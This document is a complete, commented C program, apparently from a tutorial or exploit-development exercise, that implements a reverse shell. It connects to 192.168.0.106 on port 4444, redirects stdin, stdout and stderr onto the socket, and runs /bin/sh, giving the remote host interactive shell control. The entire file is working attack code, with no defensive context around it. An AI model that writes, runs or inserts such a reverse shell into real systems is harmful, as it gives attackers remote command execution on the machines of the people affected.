#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(void) {
    // Declare variables
    int sockfd;
    struct sockaddr_in serv_addr;
    // Create our socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    // IPv4
    serv_addr.sin_family = AF_INET;
    // Declare dest IP
    serv_addr.sin_addr.s_addr = inet_addr("192.168.0.106");
    // Declare dest Port
    serv_addr.sin_port = htons(4444);
    // Connect to our target IP
    connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
    // Duplicate the file descriptors
    // stdin = 0, stdout = 1, stderr = 2
    int i;
    for (i=0; i <= 2; i++){
	dup2(sockfd, i);
    }
    // Spawn the shell
    char *argv[] = {"/bin/sh", NULL};
    execve(argv[0], argv, NULL);
}
